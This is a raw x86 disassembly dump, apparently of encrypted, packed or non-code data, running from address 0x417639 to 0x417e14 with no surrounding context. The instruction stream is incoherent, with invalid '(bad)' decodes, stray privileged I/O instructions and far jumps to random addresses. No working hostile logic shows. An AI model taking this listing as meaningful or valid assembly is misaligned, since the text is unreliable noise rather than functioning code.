  417639:	mov    eax,DWORD PTR [edi]
  41763b:	xlat   BYTE PTR ds:[ebx]
  41763c:	out    0x3e,al
  41763e:	in     eax,dx
  41763f:	cmp    al,0x9c
  417641:	cmp    ebp,DWORD PTR [ebx-0x7c]
  417644:	mov    BYTE PTR ds:0xb4535d79,dl
  41764a:	ror    al,cl
  41764c:	in     al,dx
  41764d:	add    eax,0x3a9d3168
  417652:	dec    edx
  417653:	jb     0x4176af
  417655:	add    BYTE PTR [esi-0x50],cl
  417658:	lahf   
  417659:	in     eax,dx
  41765a:	mov    dh,0x35
  41765c:	sbb    al,BYTE PTR [ebx]
  41765e:	cli    
  41765f:	test   eax,0xd2974524
  417664:	xchg   ecx,eax
  417665:	mov    bl,0xc1
  417667:	or     eax,DWORD PTR [edx]
  417669:	push   ebx
  41766a:	pop    ds
  41766b:	cld    
  41766c:	or     BYTE PTR [ecx+eiz*2-0x653a8609],al
  417673:	data16 or bh,BYTE PTR [ebp+0x1e]
  417677:	inc    esp
  417678:	shl    edi,1
  41767a:	sub    BYTE PTR [ecx],dh
  41767c:	test   eax,0x9ac71fa9
  417681:	test   al,0x45
  417683:	adc    eax,0xc70fd417
  417688:	xor    eax,0x58d98a02
  41768d:	mov    eax,0xc903ddd8
  417692:	ins    DWORD PTR es:[edi],dx
  417693:	mov    ecx,0x89dc09ce
  417699:	inc    esi
  41769a:	loope  0x41762e
  41769c:	xchg   esi,eax
  41769d:	jae    0x4176d5
  41769f:	jne    0x41762d
  4176a1:	jmp    0xa0d3c6a6
  4176a6:	fild   QWORD PTR [edx]
  4176a8:	mov    ebp,0xa5f7c91
  4176ad:	mov    cs,WORD PTR [eax-0x6b]
  4176b0:	dec    ebp
  4176b1:	mov    ds:0x3354955,eax
  4176b6:	sbb    dh,BYTE PTR [ebx]
  4176b8:	mov    ds:0x449be0cc,eax
  4176bd:	xchg   BYTE PTR [eax+0x1],ah
  4176c0:	fild   QWORD PTR [ecx]
  4176c2:	push   es
  4176c3:	push   edx
  4176c4:	mov    ebx,0xe3dca6d0
  4176c9:	add    dl,BYTE PTR [ebx+ebx*2+0x503ec405]
  4176d0:	dec    esi
  4176d1:	or     ebx,DWORD PTR [edi]
  4176d3:	lods   eax,DWORD PTR ds:[esi]
  4176d4:	fistp  QWORD PTR [esi+0x80794db]
  4176da:	xor    cl,ah
  4176dc:	pop    ds
  4176dd:	sbb    eax,esi
  4176df:	mov    dl,0xe2
  4176e1:	jno    0x4176ae
  4176e3:	push   esi
  4176e4:	pusha  
  4176e5:	jmp    0x463f8d95
  4176ea:	add    ah,bh
  4176ec:	mov    BYTE PTR [edi+0x142839a9],bh
  4176f2:	int    0x16
  4176f4:	and    eax,DWORD PTR [edx]
  4176f6:	shl    BYTE PTR [eax+0x571903e6],1
  4176fc:	inc    esp
  4176fd:	cmp    al,0x32
  4176ff:	dec    DWORD PTR [edx+0x12]
  417702:	ds or  al,0xf2
  417705:	push   es
  417706:	pop    edi
  417707:	daa    
  417708:	jle    0x4176dd
  41770a:	sub    ah,dl
  41770c:	clc    
  41770d:	mov    ah,0x6a
  41770f:	jl     0x41777f
  417711:	sub    BYTE PTR [eax-0x18e77a5],0xfb
  417718:	dec    eax
  417719:	dec    esi
  41771a:	pop    esp
  41771b:	push   DWORD PTR [ebp+0x3]
  41771e:	rol    BYTE PTR ds:0xbbef5eb0,0xb9
  417725:	xchg   BYTE PTR [eax+0xb],ah
  417728:	xchg   edi,eax
  417729:	test   al,0x6a
  41772b:	lea    ebp,[edx-0x602b3f98]
  417731:	rcr    BYTE PTR [ecx-0x2a09192b],1
  417737:	or     DWORD PTR [eax+0x3bf2abed],0xffffffc8
  41773e:	cmp    BYTE PTR [ebp+0x4d],0x1d
  417742:	or     al,0x42
  417744:	in     eax,dx
  417745:	pop    ds
  417746:	jmp    0x4176ee
  417748:	jmp    0x71310653
  41774d:	test   DWORD PTR [eax-0x57],esp
  417750:	xor    al,0x19
  417752:	into   
  417753:	jbe    0x417789
  417755:	sub    ah,BYTE PTR [esp+edx*8-0x36e10d95]
  41775c:	lods   eax,DWORD PTR ds:[esi]
  41775d:	xchg   ebx,eax
  41775e:	inc    ecx
  41775f:	out    dx,eax
  417760:	mov    BYTE PTR [ecx],dh
  417762:	ins    DWORD PTR es:[edi],dx
  417763:	sub    BYTE PTR [bx+0x7f],dh
  417767:	jo     0x4177d4
  417769:	add    edx,eax
  41776b:	call   0x5fa0:0x4d6e5743
  417772:	pop    ds
  417773:	adc    DWORD PTR [edi+ebx*2],ebx
  417776:	mov    ebx,0xfa732a63
  41777b:	aam    0x6e
  41777d:	loope  0x417736
  41777f:	push   0x9f023819
  417784:	mov    BYTE PTR [edi],bl
  417786:	cmc    
  417787:	pop    es
  417788:	je     0x4177ab
  41778a:	pop    ebx
  41778b:	inc    esi
  41778c:	sahf   
  41778d:	add    eax,0x89e6970e
  417792:	xchg   BYTE PTR [ecx-0x54533d0f],ah
  417798:	or     dh,BYTE PTR [edx+ebx*2]
  41779b:	jmp    0x417725
  41779d:	jae    0x41774d
  41779f:	imul   ecx,DWORD PTR [esi],0x78
  4177a2:	xlat   BYTE PTR ss:[ebx]
  4177a4:	stos   BYTE PTR es:[edi],al
  4177a5:	shl    cl,0x12
  4177a8:	jg     0x4177f8
  4177aa:	ja     0x417771
  4177ac:	mov    BYTE PTR [ebp+0x664f2586],cl
  4177b2:	sahf   
  4177b3:	xchg   edx,eax
  4177b4:	or     al,0x66
  4177b6:	test   dl,dl
  4177b8:	inc    edi
  4177b9:	add    ebx,esi
  4177bb:	scas   al,BYTE PTR es:[edi]
  4177bc:	arpl   WORD PTR [ecx],cx
  4177be:	jne    0x4177fc
  4177c0:	mov    ebx,eax
  4177c2:	repnz cdq 
  4177c4:	sbb    eax,0xdaadaa5c
  4177c9:	add    eax,0xbf127c78
  4177ce:	jno    0x41783e
  4177d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177d1:	inc    ecx
  4177d2:	push   ds
  4177d3:	test   DWORD PTR [ebx+0x4a],esp
  4177d6:	add    eax,0x462544bf
  4177db:	aam    0x37
  4177dd:	fadd   QWORD PTR [eax+0x42]
  4177e0:	fistp  QWORD PTR [ebx+0x478968c6]
  4177e6:	div    DWORD PTR [esi-0x20d36b0d]
  4177ec:	cwde   
  4177ed:	gs pop es
  4177ef:	sahf   
  4177f0:	js     0x4177b0
  4177f2:	add    edi,edx
  4177f4:	sar    BYTE PTR es:[edx],1
  4177f7:	cs out dx,al
  4177f9:	iret   
  4177fa:	pusha  
  4177fb:	xchg   ebp,eax
  4177fc:	inc    ebx
  4177fd:	sar    edi,cl
  4177ff:	sbb    eax,0xd4e593e0
  417804:	jmp    0x4177f3
  417806:	idiv   cl
  417808:	shl    DWORD PTR ds:0x778e3112,cl
  41780e:	fbstp  TBYTE PTR [ebx+0x7b]
  417811:	add    BYTE PTR [eax],0x97
  417814:	mov    es:0x20708be5,al
  41781a:	cli    
  41781b:	aad    0xfa
  41781d:	cld    
  41781e:	push   ss
  41781f:	sbb    edi,DWORD PTR [ecx+0x768960b8]
  417825:	addr16 jae 0x417876
  417828:	mov    esi,0x98bacbeb
  41782d:	fimul  WORD PTR [ebx]
  41782f:	jbe    0x3c38ac00
  417835:	mov    bl,0x98
  417837:	jmp    0x90bfa1c0
  41783c:	push   ebx
  41783d:	pop    ecx
  41783e:	out    dx,al
  41783f:	add    al,0xb3
  417841:	inc    ebx
  417842:	fs std 
  417844:	fcom   QWORD PTR [eax+0x57]
  417847:	sbb    eax,edi
  417849:	sub    al,0x2a
  41784b:	mov    bl,0x89
  41784d:	sub    eax,0x9528f31b
  417852:	das    
  417853:	xchg   BYTE PTR [edx+0x28758de0],dh
  417859:	add    bh,al
  41785b:	cld    
  41785c:	xor    BYTE PTR [esp+eax*4+0x1f7d4db9],ah
  417863:	test   DWORD PTR [ecx+0x48],0xe530457c
  41786a:	rcl    ch,1
  41786c:	mov    bh,0x9f
  41786e:	push   es
  41786f:	pop    edx
  417870:	and    bl,BYTE PTR [edx+ecx*4]
  417873:	loopne 0x4177fd
  417875:	xchg   edx,edi
  417877:	add    esi,ecx
  417879:	repnz sub bh,BYTE PTR ds:[eax-0x37a43fe]
  417881:	loop   0x417845
  417883:	jle    0x41782f
  417885:	mov    ds:0x8f902d7d,al
  41788a:	lea    edx,[ebp-0x43]
  41788d:	xchg   DWORD PTR [ebx],edi
  41788f:	bnd je 0x417894
  417892:	mov    esi,0xeb5f6398
  417897:	enter  0x8b5,0x1f
  41789b:	cmp    DWORD PTR [edx*4-0x288dd451],ebp
  4178a2:	add    dl,ah
  4178a4:	mov    ss,WORD PTR [edx]
  4178a6:	mov    dl,0xaf
  4178a8:	inc    ebp
  4178a9:	and    al,0x29
  4178ab:	dec    ebp
  4178ac:	mov    BYTE PTR [ecx-0x5d],ah
  4178af:	sub    al,0xe9
  4178b1:	(bad)  
  4178b2:	mov    esi,0xa0b6040
  4178b7:	fimul  DWORD PTR [edx]
  4178ba:	jmp    0x417910
  4178bc:	and    al,0x72
  4178be:	jno    0x4178f0
  4178c0:	mov    al,0xeb
  4178c2:	outs   dx,BYTE PTR ds:[esi]
  4178c3:	sub    edx,eax
  4178c5:	xor    al,0x6c
  4178c7:	sbb    DWORD PTR [edi+0x6e],eax
  4178ca:	fild   QWORD PTR [edi-0x2a443fa4]
  4178d0:	stos   DWORD PTR es:[edi],eax
  4178d1:	mov    WORD PTR [ebp-0x5a],cs
  4178d4:	lea    ebx,[ecx]
  4178d6:	push   ss
  4178d7:	ror    DWORD PTR [ebx+0x6d12e69b],0x9f
  4178de:	mov    ds:0xfee9608f,eax
  4178e3:	aad    0x6e
  4178e5:	shl    DWORD PTR [edx+0x42f2fb22],cl
  4178eb:	fadd   QWORD PTR [ebp-0x1d]
  4178ee:	pusha  
  4178ef:	outs   dx,DWORD PTR ds:[esi]
  4178f0:	popa   
  4178f1:	xchg   esp,eax
  4178f2:	ret    0xe86
  4178f5:	cdq    
  4178f6:	data16 rcr BYTE PTR [eax+eiz*2+0x66],cl
  4178fb:	or     esi,DWORD PTR [ecx]
  4178fd:	fucomi st,st(7)
  4178ff:	mov    dl,BYTE PTR [ecx+0x7d]
  417902:	jp     0x4178dd
  417904:	xchg   BYTE PTR [ebx-0x3d],bl
  417907:	call   0xed2:0xe6181f08
  41790e:	or     al,0xd4
  417910:	ret    0x9e25
  417913:	clc    
  417914:	aas    
  417915:	imul   ebp,DWORD PTR [eax-0x74],0x7d5be369
  41791c:	and    eax,0xcbcdfd2d
  417921:	inc    ebp
  417922:	sub    bl,dh
  417924:	je     0x41792b
  417926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417927:	rcr    BYTE PTR [ebx],cl
  417929:	gs jbe 0x417948
  41792c:	sbb    BYTE PTR [ecx],cl
  41792e:	mov    edi,0x60c9208a
  417933:	repz sub al,BYTE PTR [edx+esi*8-0x7d]
  417938:	xchg   edi,eax
  417939:	or     eax,0x306f6e5
  41793e:	test   al,0xbc
  417940:	arpl   WORD PTR [edi],bx
  417942:	es xor eax,0x9b1fefa0
  417948:	lock mov esi,0x652e4bcb
  41794e:	push   ebx
  41794f:	aam    0x47
  417951:	cmp    BYTE PTR [edx+eiz*1+0x2d372c38],dl
  417958:	adc    BYTE PTR [edx],ah
  41795a:	rcl    ch,0xba
  41795d:	jp     0x417919
  41795f:	push   DWORD PTR [ebx+0x3]
  417962:	push   ebx
  417963:	add    al,0xa7
  417965:	and    al,0x5b
  417967:	int    0x2e
  417969:	add    al,bl
  41796b:	or     BYTE PTR [esi+0x76f0824f],dl
  417971:	sbb    BYTE PTR [eax-0x21],dl
  417974:	dec    ebp
  417976:	adc    BYTE PTR [eax-0x2a1370f8],ch
  41797c:	add    eax,0x9f50dc21
  417981:	push   ecx
  417982:	test   al,0x2f
  417984:	clc    
  417985:	addr16 int3 
  417987:	aad    0x91
  417989:	push   0x2e
  41798b:	aaa    
  41798c:	enter  0xba9f,0xd5
  417990:	imul   ecx,DWORD PTR [ecx],0x8562be72
  417996:	jmp    0xedaf01a5
  41799b:	mov    al,0xc2
  41799d:	dec    ebx
  41799e:	pop    ebx
  41799f:	jg     0x4179ac
  4179a1:	add    BYTE PTR [eax-0x6e75a5be],ah
  4179a7:	shr    DWORD PTR [ebx],0xab
  4179aa:	adc    al,ah
  4179ac:	sbb    BYTE PTR [ebx+0x7b],0x10
  4179b0:	lahf   
  4179b1:	neg    DWORD PTR [edi-0x46133f80]
  4179b7:	aad    0x57
  4179b9:	dec    eax
  4179ba:	(bad)  
  4179bb:	mov    dh,0x33
  4179bd:	imul   ebp,DWORD PTR [ebx-0x44],0xffffff88
  4179c1:	mov    ch,0x9f
  4179c3:	cmc    
  4179c4:	(bad)  
  4179c5:	xlat   BYTE PTR ds:[ebx]
  4179c6:	mov    ch,0xc3
  4179c8:	out    dx,al
  4179c9:	daa    
  4179ca:	inc    esp
  4179cb:	stc    
  4179cc:	xor    DWORD PTR [edx-0x604fe1d9],ecx
  4179d2:	ror    BYTE PTR [edx-0x7],1
  4179d5:	xchg   esi,eax
  4179d6:	jnp    0x417a26
  4179d8:	mov    edi,esi
  4179da:	cmp    eax,0x42e85fac
  4179df:	outs   dx,BYTE PTR ds:[esi]
  4179e0:	sbb    al,BYTE PTR [ebx]
  4179e2:	push   edx
  4179e3:	test   BYTE PTR [eax],0x19
  4179e6:	daa    
  4179e7:	sbb    edx,esi
  4179e9:	push   cs
  4179ea:	pusha  
  4179eb:	fldcw  WORD PTR [edi+0x2855a7d0]
  4179f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179f2:	sub    ah,dl
  4179f4:	and    eax,0x1b9beb29
  4179f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179fa:	xchg   ebp,eax
  4179fb:	imul   ecx,DWORD PTR [ebx+0x38ea3d5],0xffffffc0
  417a02:	adc    ecx,eax
  417a04:	sbb    BYTE PTR [ecx],dl
  417a06:	pushf  
  417a07:	aam    0xb2
  417a09:	ja     0x417a82
  417a0b:	outs   dx,DWORD PTR ds:[esi]
  417a0c:	adc    ebx,DWORD PTR [edx+0x1bb3b998]
  417a12:	loopne 0x417a4d
  417a14:	or     BYTE PTR [esp+edi*8],bl
  417a17:	stos   BYTE PTR es:[edi],al
  417a18:	adc    ah,cl
  417a1a:	(bad)  
  417a1b:	lods   al,BYTE PTR ds:[esi]
  417a1c:	hlt    
  417a1d:	hlt    
  417a1e:	mov    eax,ds:0xc885d1f5
  417a23:	pop    ss
  417a24:	push   0x7bbdd0ec
  417a29:	add    DWORD PTR [eax+0x2c12fed4],eax
  417a2f:	xor    eax,0xc17d0930
  417a34:	lods   al,BYTE PTR ds:[esi]
  417a35:	add    eax,0x8bc9c166
  417a3a:	and    eax,0xf3639af
  417a3f:	test   BYTE PTR [eax+0x5beba30d],cl
  417a45:	sub    dl,BYTE PTR [edx]
  417a47:	or     BYTE PTR [ebp-0x769b5f8e],ch
  417a4d:	les    edx,FWORD PTR [edi]
  417a4f:	xor    esp,ecx
  417a51:	sbb    al,0x44
  417a53:	inc    ebp
  417a54:	cli    
  417a55:	mov    edi,0x98abd4d7
  417a5a:	jnp    0x417a18
  417a5c:	adc    BYTE PTR [ecx],bl
  417a5e:	lods   al,BYTE PTR ds:[esi]
  417a5f:	aam    0x67
  417a61:	(bad)  
  417a62:	fbld   TBYTE PTR [ebx-0x35e2cb98]
  417a68:	hlt    
  417a69:	leave  
  417a6a:	(bad)  
  417a6c:	stos   DWORD PTR es:[edi],eax
  417a6d:	mov    al,0x3a
  417a6f:	mov    al,ds:0xd49a4804
  417a74:	dec    ecx
  417a75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a76:	pavgw  mm1,QWORD PTR [esp+edx*4]
  417a7a:	add    DWORD PTR [ecx],ebx
  417a7c:	jbe    0x417a61
  417a7e:	or     BYTE PTR [eax-0x28672004],0x9c
  417a85:	or     BYTE PTR [ebp+0x2fa7c004],0x6f
  417a8c:	pop    esp
  417a8d:	add    eax,DWORD PTR [edx]
  417a8f:	sahf   
  417a90:	aaa    
  417a91:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  417a93:	inc    esp
  417a94:	fistp  WORD PTR [ecx-0x12a186e1]
  417a9a:	test   eax,0xf0c21ef0
  417a9f:	mov    ecx,0x49fecfe2
  417aa4:	or     BYTE PTR [edi+0x3e],bl
  417aa7:	(bad)  
  417aa8:	push   esi
  417aa9:	(bad)  
  417aaa:	bound  eax,QWORD PTR [edi+0x62]
  417aad:	outs   dx,BYTE PTR ds:[esi]
  417aae:	and    eax,0xf88a2caa
  417ab3:	es out 0x5,al
  417ab6:	div    BYTE PTR [eax]
  417ab8:	pop    ds
  417ab9:	adc    al,BYTE PTR [edi-0x5]
  417abc:	and    esi,0x1f
  417abf:	mov    ebp,0x9ae6bcaf
  417ac4:	imul   ebp,ebp,0xffffffab
  417ac7:	inc    edx
  417ac8:	sbb    BYTE PTR ds:0x591b0d71,al
  417ace:	push   ds
  417acf:	pop    ecx
  417ad0:	pusha  
  417ad1:	or     DWORD PTR [ebx-0x63],ebp
  417ad4:	mov    BYTE PTR ds:0xa3d86add,bl
  417ada:	xor    al,0xa2
  417adc:	xchg   edx,eax
  417add:	add    bl,BYTE PTR [edx-0x55ef1f4a]
  417ae3:	jl     0x417b2e
  417ae5:	cmp    BYTE PTR [edx+0x1305f30b],bl
  417aeb:	inc    esi
  417aec:	xor    bl,ch
  417aee:	add    BYTE PTR [esi],bh
  417af0:	pop    ecx
  417af1:	sub    esi,DWORD PTR [edx-0x774dac3b]
  417af7:	xlat   BYTE PTR ds:[ebx]
  417af8:	mov    ebx,ecx
  417afa:	sub    ch,dl
  417afc:	cwde   
  417afd:	mov    esi,0x5997cbd
  417b02:	dec    eax
  417b03:	popf   
  417b04:	lahf   
  417b05:	loop   0x417af3
  417b07:	jo     0x417ad0
  417b09:	jne    0x417b88
  417b0b:	xchg   edx,esp
  417b0d:	test   BYTE PTR [ebx],0xad
  417b10:	pop    esp
  417b11:	repz adc BYTE PTR [ecx-0x6a],0xc1
  417b16:	stc    
  417b17:	scas   al,BYTE PTR es:[edi]
  417b18:	mov    edx,0xb456609a
  417b1d:	pop    edx
  417b1e:	jl     0x417af4
  417b20:	call   0x5e59:0xfbb74445
  417b27:	enter  0x158a,0x41
  417b2b:	ret    0xf680
  417b2e:	xchg   esi,eax
  417b2f:	out    dx,eax
  417b30:	lea    ecx,es:[esi]
  417b33:	pop    ss
  417b34:	dec    esi
  417b35:	mov    al,ds:0x77db8ec
  417b3a:	dec    ebx
  417b3b:	ins    DWORD PTR es:[edi],dx
  417b3c:	enter  0xdaa,0x94
  417b40:	add    bl,BYTE PTR [esi+0x2ccd7760]
  417b46:	dec    ebx
  417b47:	inc    edx
  417b48:	je     0x417adf
  417b4a:	ret    
  417b4b:	lods   al,BYTE PTR ds:[esi]
  417b4c:	xor    dh,BYTE PTR [eax-0x7d0ff329]
  417b52:	mov    esi,0x60971b5e
  417b57:	iret   
  417b58:	daa    
  417b59:	sahf   
  417b5a:	adc    al,0x12
  417b5c:	mov    esi,0x3fd5ffd0
  417b61:	out    0x46,al
  417b63:	cs mov bl,0xe
  417b66:	jp     0x417b8c
  417b68:	mov    BYTE PTR [edi-0x50],bl
  417b6b:	repnz add eax,0xb77ce62e
  417b71:	add    bl,BYTE PTR [edx]
  417b73:	sbb    al,0x24
  417b75:	sub    BYTE PTR [edi],0x1c
  417b78:	pusha  
  417b79:	stos   DWORD PTR es:[edi],eax
  417b7a:	pusha  
  417b7b:	icebp  
  417b7c:	js     0x417b8a
  417b7e:	push   esi
  417b7f:	xchg   ebp,eax
  417b80:	js     0x417b17
  417b82:	aam    0xd4
  417b84:	xchg   DWORD PTR [esi-0x7e],eax
  417b87:	cmp    BYTE PTR [edx+0x11],ch
  417b8a:	mov    ecx,esp
  417b8c:	mov    edi,esp
  417b8e:	push   eax
  417b8f:	pop    ebx
  417b90:	test   BYTE PTR [eax+0x38],ah
  417b93:	sti    
  417b94:	xchg   esi,eax
  417b95:	sub    al,0x1c
  417b97:	mov    esp,DWORD PTR [edx+esi*4+0x72ab2f1f]
  417b9e:	call   0x645cd803
  417ba3:	imul   esp,DWORD PTR [edx+0xb0c870c],0x2ec64eb3
  417bad:	add    dl,BYTE PTR [eax+0x65e4fc1c]
  417bb3:	(bad)  
  417bb4:	pop    edx
  417bb5:	out    dx,al
  417bb6:	pusha  
  417bb7:	cmp    eax,0xc30ecc29
  417bbc:	push   edi
  417bbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bbe:	add    al,0x5c
  417bc0:	test   DWORD PTR [edi+0x728a4960],0x4b2f6b5f
  417bca:	push   ds
  417bcb:	lds    edi,FWORD PTR [edx+eiz*8]
  417bce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bcf:	adc    esp,edx
  417bd1:	mov    al,0x40
  417bd3:	cmc    
  417bd4:	fsub   QWORD PTR [edx+edx*1]
  417bd7:	cwde   
  417bd8:	sbb    esp,DWORD PTR [edx+0x1e]
  417bdb:	pop    esi
  417bdc:	add    al,BYTE PTR [edx]
  417bde:	pop    ecx
  417bdf:	mov    BYTE PTR [ecx-0x5373ce3b],cl
  417be5:	shr    BYTE PTR [eax-0x31fa6bbd],cl
  417beb:	pop    edi
  417bec:	mov    edx,0xaae68461
  417bf1:	push   ds
  417bf2:	pop    ds
  417bf3:	rcl    DWORD PTR [ebx+0x4b],1
  417bf6:	imul   edi,DWORD PTR [edx+edi*8+0x4f],0xfc10d357
  417bfe:	sbb    bl,BYTE PTR [ecx+0x221e200d]
  417c04:	add    ebp,esp
  417c06:	nop
  417c07:	cdq    
  417c08:	daa    
  417c09:	add    ebp,DWORD PTR [eax-0x3b137a07]
  417c0f:	jg     0x417bb9
  417c11:	add    eax,0x2ff655a4
  417c16:	loopne 0x417c11
  417c18:	ret    0x1f1e
  417c1b:	pop    ds
  417c1c:	clc    
  417c1d:	pushf  
  417c1e:	shl    BYTE PTR [eax-0x28e63a26],1
  417c24:	mov    bh,0x9b
  417c26:	mov    fs,ecx
  417c28:	(bad)  
  417c29:	cs inc esi
  417c2b:	std    
  417c2c:	mov    bh,0x21
  417c2e:	out    dx,eax
  417c2f:	out    dx,al
  417c30:	mov    BYTE PTR [esi+0x3b],ch
  417c33:	jns    0x417caf
  417c35:	jb     0x417c09
  417c37:	aam    0xa9
  417c39:	clc    
  417c3a:	push   0xffffff91
  417c3c:	addr16 xchg edi,eax
  417c3e:	sbb    BYTE PTR [edi-0x14a99678],0xe8
  417c45:	(bad)  
  417c46:	add    DWORD PTR ds:0x6ca00308,ebx
  417c4c:	inc    ebp
  417c4d:	cmp    DWORD PTR [edi+0x656ac6bb],ebx
  417c53:	mov    eax,ds:0xaf632a32
  417c58:	call   0x2eb59949
  417c5d:	aas    
  417c5e:	jns    0x417c0e
  417c60:	sub    dl,BYTE PTR [esi]
  417c62:	ret    0xc995
  417c65:	add    bh,BYTE PTR [ebx+0x1fc9faf6]
  417c6b:	ins    DWORD PTR es:[edi],dx
  417c6c:	repz ret 
  417c6e:	imul   eax,DWORD PTR [ebp-0x1945065c],0xd7a7c268
  417c78:	out    0xa8,eax
  417c7a:	pop    es
  417c7b:	gs in  al,dx
  417c7d:	mov    edi,0x89a094ea
  417c82:	xchg   cx,ax
  417c84:	mov    al,ds:0xe2b841bb
  417c89:	inc    edx
  417c8a:	and    eax,0x4e058034
  417c8f:	push   es
  417c90:	cmp    BYTE PTR [edx+0x176c2e83],ch
  417c96:	ins    BYTE PTR es:[edi],dx
  417c97:	add    DWORD PTR [ebp+0x2e806395],edi
  417c9d:	leave  
  417c9e:	or     eax,DWORD PTR [ebx+edx*4]
  417ca1:	(bad)  [ebp-0x71fdf139]
  417ca7:	bndldx (bad),[eax+0x5d]
  417cab:	mov    al,0xd0
  417cad:	xchg   ebx,eax
  417cae:	pusha  
  417caf:	(bad)  
  417cb0:	or     al,0xa1
  417cb2:	and    al,0xdf
  417cb4:	mov    ebp,DWORD PTR [ecx+ebp*1]
  417cb7:	pop    edi
  417cb8:	data16 jmp 0x417d1b
  417cbb:	out    0x22,al
  417cbd:	sbb    BYTE PTR [eax-0x21],dl
  417cc0:	pop    ecx
  417cc1:	dec    edi
  417cc2:	push   ds
  417cc3:	add    eax,0x69760394
  417cc8:	stos   BYTE PTR es:[edi],al
  417cc9:	mov    ah,0x37
  417ccb:	lods   eax,DWORD PTR ds:[esi]
  417ccc:	cli    
  417ccd:	ja     0x417cce
  417ccf:	fwait
  417cd0:	push   cs
  417cd1:	je     0x417cff
  417cd3:	ja     0x417cbd
  417cd5:	fstp   QWORD PTR [edi-0x3eb44d3b]
  417cdb:	daa    
  417cdc:	rdtsc  
  417cde:	clc    
  417cdf:	cmp    DWORD PTR [eax],eax
  417ce1:	jecxz  0x417d17
  417ce3:	shl    BYTE PTR [esi-0x1f28e31e],cl
  417ce9:	fs into 
  417ceb:	lods   eax,DWORD PTR ds:[esi]
  417cec:	xchg   edx,eax
  417ced:	xchg   ebp,eax
  417cee:	loope  0x417ce2
  417cf0:	mov    BYTE PTR [ebx-0xc15d53b],bh
  417cf6:	xchg   ebx,eax
  417cf7:	std    
  417cf8:	nop
  417cf9:	or     esp,DWORD PTR [ebp-0x2d]
  417cfc:	push   ss
  417cfd:	push   cs
  417cfe:	pop    es
  417cff:	retf   0x9ac0
  417d02:	scas   eax,DWORD PTR es:[edi]
  417d03:	inc    eax
  417d04:	push   ss
  417d05:	adc    ebx,DWORD PTR [edi]
  417d07:	dec    ebp
  417d08:	adc    dl,BYTE PTR [eax+0x3c]
  417d0b:	ja     0x417ce3
  417d0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d0e:	jmp    0x417ce5
  417d10:	sbb    al,BYTE PTR ds:0x4c7c4f
  417d16:	sahf   
  417d17:	shl    al,cl
  417d19:	xor    DWORD PTR [edi],edi
  417d1b:	aam    0x1
  417d1d:	sub    ah,BYTE PTR ds:0x43f9062
  417d23:	xlat   BYTE PTR ds:[ebx]
  417d24:	xor    cl,BYTE PTR [edi+edx*1-0x14]
  417d28:	cmp    BYTE PTR [eax+edi*1],cl
  417d2b:	js     0x417cb6
  417d2d:	adc    esp,esi
  417d2f:	je     0x417d54
  417d31:	js     0x417d0c
  417d33:	adc    al,0xfb
  417d35:	add    BYTE PTR [edx+0x4dc97c4b],ch
  417d3b:	lds    esp,FWORD PTR [edi]
  417d3d:	jecxz  0x417ce4
  417d3f:	lock mov DWORD PTR [edi-0x4c0426ef],ebp
  417d46:	add    cl,al
  417d48:	int    0x5
  417d4a:	out    dx,al
  417d4b:	cmp    dh,cl
  417d4d:	push   ss
  417d4e:	das    
  417d4f:	jge    0x417d1c
  417d51:	icebp  
  417d52:	adc    BYTE PTR [eax],ch
  417d54:	mov    DWORD PTR [ebx+0x5],ebx
  417d57:	mov    ecx,0x9f9c9bfe
  417d5c:	aas    
  417d5d:	inc    edi
  417d5e:	cmp    ah,BYTE PTR [eax+0x557949ce]
  417d64:	mov    al,ds:0x6c258638
  417d69:	enter  0xed92,0xd6
  417d6d:	add    dl,BYTE PTR [eax]
  417d6f:	in     eax,dx
  417d70:	jle    0x417d62
  417d72:	mov    bh,0x79
  417d74:	inc    BYTE PTR [edx]
  417d76:	clc    
  417d77:	jb     0x417d39
  417d79:	sbb    cl,BYTE PTR [ebx]
  417d7b:	xchg   BYTE PTR [edx],bh
  417d7d:	inc    edi
  417d7e:	aaa    
  417d7f:	or     ecx,DWORD PTR [edx-0x73e2b2c1]
  417d85:	imul   edi,DWORD PTR [eax-0x1bad462],0xfe02f9a0
  417d8f:	cmp    eax,0x917acc19
  417d94:	sbb    eax,0xa78760a9
  417d99:	les    esp,FWORD PTR gs:[esi+0x6c]
  417d9d:	or     BYTE PTR [edx-0x63],al
  417da0:	(bad)  
  417da1:	cmp    ecx,DWORD PTR [edi-0x2c]
  417da4:	aam    0x3e
  417da6:	sbb    BYTE PTR ds:0x4f1f581a,0x10
  417dad:	xchg   ebp,eax
  417dae:	repz lds eax,FWORD PTR [esi+0x64]
  417db2:	icebp  
  417db3:	aam    0xe8
  417db5:	xor    BYTE PTR [ebx+0x4264d29c],cl
  417dbb:	test   DWORD PTR [eax-0x3fcab219],ecx
  417dc1:	mov    ds:0xab6a3333,al
  417dc6:	jmp    0x417e05
  417dc8:	xchg   ebp,eax
  417dc9:	aad    0x86
  417dcb:	add    edi,esi
  417dcd:	add    eax,0x3b5f1380
  417dd2:	or     edi,DWORD PTR [ecx+edi*8]
  417dd5:	(bad)  
  417dd6:	gs mov ebx,0x180d95c8
  417ddc:	cdq    
  417ddd:	ficomp WORD PTR [edx+0x55]
  417de0:	adc    BYTE PTR [ecx],0x42
  417de3:	aad    0x6e
  417de5:	call   0xa166e2e6
  417dea:	push   0xffffffab
  417dec:	mov    cl,ch
  417dee:	xchg   esp,eax
  417def:	jnp    0x417e07
  417df1:	xlat   BYTE PTR ds:[ebx]
  417df2:	add    ecx,DWORD PTR [ecx]
  417df4:	xchg   edi,eax
  417df5:	das    
  417df6:	cmp    al,BYTE PTR [eax+0x1e608f39]
  417dfc:	push   0x89b0b542
  417e01:	sbb    esp,edx
  417e03:	mov    al,BYTE PTR [edi-0x1a9dcbbc]
  417e09:	add    eax,0x68567160
  417e0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e0f:	inc    edi
  417e10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e11:	pop    eax
  417e12:	ds stos DWORD PTR es:[edi],eax
  417e14:	cmp    BYTE PTR [esi-0x18],dl
